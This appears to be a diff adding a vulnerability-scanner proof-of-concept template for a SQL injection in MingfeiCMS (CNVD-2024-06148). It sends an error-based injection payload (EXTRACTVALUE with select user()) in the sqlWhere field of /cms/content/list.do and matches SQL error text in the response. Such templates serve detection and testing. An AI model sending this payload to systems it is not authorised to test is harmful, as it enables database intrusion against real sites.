@@ -1,0 +1,24 @@
+name: poc-yaml-mingfeiCMS-sql-CNVD-2024-06148
+transport: http
+
+
+
+rules:
+  r0:
+    request:
+      method: POST
+      path: /cms/content/list.do
+      headers:
+        User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Acoo Browser; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; .NET CLR 3.0.04506)
+        Content-Type: application/x-www-form-urlencoded
+      body: 'sqlWhere=[{"action"%3a"","field"%3a"1+AND+EXTRACTVALUE(4095,CONCAT(0x7e,(select user()),0x7e))","el":"eq","model":"contentTitle","name":"123","type":"input","value":"a"}]'
+    expression: response.status == 500 && response.body.bcontains(b'java.sql.SQLException') && response.body.bcontains(b'syntax error')
+
+expression: r0() 
+
+detail:
+  author: Superhero
+  links:
+    - https://blog.csdn.net/m0_60571842/article/details/140300863
+
+
